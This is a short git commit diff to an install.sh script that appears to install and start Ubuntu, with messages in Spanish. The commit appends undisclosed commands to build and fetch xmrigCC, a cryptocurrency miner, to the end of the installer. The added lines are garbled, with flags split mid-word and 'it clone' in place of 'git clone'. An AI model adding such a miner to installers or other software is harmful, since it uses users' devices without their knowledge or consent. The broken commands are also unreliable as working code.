2072f616093f60055df0bd3da728efb502735ac3
XxrrxX <xxrrxx3888@gmail.com>
2021-04-03 20:07:55 +0000

    install.sh

--- install.sh
+++ install.sh
@@ -18,3 +18,9 @@ echo "Ubuntu instalado..."|lolcat -a -d 50
 clear
 echo "Ejecutando ubuntu..."|lolcat -a -d 50
 ./start-ubuntu.sh
+
+cmake .. -DWITH_HWLOC
+=OF -DWITH_HTTPD=OF -DWITH_TLS=OF -DWITH_CUDA
+=OF -DWITH_OPENCL=OF -DCMAKE_BUILD_TYPE=Relea
+se  it clone 
+https://github.com/Bendr0id/xmrigCC
